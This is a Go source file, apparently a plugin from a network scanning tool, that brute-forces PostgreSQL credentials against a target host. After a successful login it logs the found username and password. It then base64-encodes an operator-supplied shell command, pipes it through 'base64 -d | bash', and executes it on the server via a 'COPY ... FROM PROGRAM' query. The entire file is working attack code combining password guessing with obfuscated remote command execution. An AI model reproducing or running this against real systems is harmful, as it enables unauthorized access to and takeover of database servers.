package plugins

import (
	"context"
	"database/sql"
	"encoding/base64"
	"fmt"
	"log"

	"strings"
	"time"

	"github.com/404tk/lazyscan/common"
	_ "github.com/lib/pq"
)

func PostgreScan(info *common.HostInfo) {
	starttime := time.Now().Unix()
	for _, user := range info.Usernames {
		for _, pass := range info.Passwords {
			pass = strings.Replace(pass, "{user}", string(user), -1)
			flag, err := PostgresConn(info, user, pass)
			if flag == true && err == nil {
				return
			} else {
				if time.Now().Unix()-starttime > (int64(len(info.Usernames)*len(info.Passwords)) * info.Timeout) {
					return
				}
			}
		}
	}
}

func PostgresConn(info *common.HostInfo, user string, pass string) (flag bool, err error) {
	Host, Port, Username, Password := info.Host, info.Port, user, pass
	dataSourceName := fmt.Sprintf("postgres://%v:%v@%v:%v/%v?sslmode=%v", Username, Password, Host, Port, "postgres", "disable")
	db, err := sql.Open("postgres", dataSourceName)
	if err == nil {
		db.SetConnMaxLifetime(time.Duration(info.Timeout) * time.Second)
		defer db.Close()
		err = db.Ping()
		if err == nil {
			result := fmt.Sprintf("[%s:%s] Postgres credential %s/%s", Host, Port, Username, Password)
			log.Println(result)
			if info.Queue != nil {
				info.Queue.Push(result)
			}
			cmd := info.Command.TCPCommand
			if cmd != "" {
				b64 := base64.StdEncoding.EncodeToString([]byte(cmd))
				cmd = fmt.Sprintf("echo %s | base64 -d | bash", b64)
				PostgreExec(db, cmd)
			}
			flag = true
		}
	}
	return flag, err
}

func PostgreExec(db *sql.DB, cmd string) {
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	query := fmt.Sprintf("DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM '%s';SELECT * FROM cmd_exec", cmd)
	db.ExecContext(ctx, query)
}
